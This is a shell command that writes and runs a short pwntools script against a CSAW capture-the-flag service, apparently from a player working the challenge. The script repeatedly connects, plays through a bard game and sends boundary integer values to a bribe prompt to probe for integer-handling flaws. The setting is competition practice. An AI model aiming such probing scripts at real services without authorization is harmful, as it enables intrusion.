cd /home/ctfplayer/ctf_files && cat > specific_values.py << 'EOF'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.log_level = 'info'

# Try different values for the bribe
values_to_try = [
    "0",  
    "-1", 
    "0xdeadbeef",  # Hex value
    "3735928559",  # Decimal of 0xdeadbeef
    "deadbeef",    # String "deadbeef"
    "-3735928559", # Negative of 0xdeadbeef
    "4294967296",  # 2^32
    "-2147483648", # -2^31
    "2147483647"   # 2^31-1
]

for value in values_to_try:
    print(f"\nTrying value: {value}")
    
    # Create a connection to the remote service
    p = remote('pwn.chal.csaw.io', 8000)
    
    # Set up the good bards
    for i in range(1, 11):
        p.sendlineafter(b'evil):', b'g')
        p.sendlineafter(b'accuracy', b'1')
        p.sendlineafter(b'name:', f"Bard{i}".encode())
    
    # We should end up confronting deadbeef
    p.recvuntil(b'deadbeef')
    p.recvuntil(b'(r)un')
    
    # Try the bribe option
    p.sendline(b'b')
    
    # Enter our test value
    p.recvuntil(b'retire?')
    p.sendline(value.encode())
    
    # Get the response and print it
    response = p.recvline().strip()
    print(f"Response: {response}")
    
    # Get the next line for additional context
    next_line = p.recvline().strip()
    print(f"Next line: {next_line}")
    
    # Close the connection
    p.close()
EOF

python3 specific_values.py
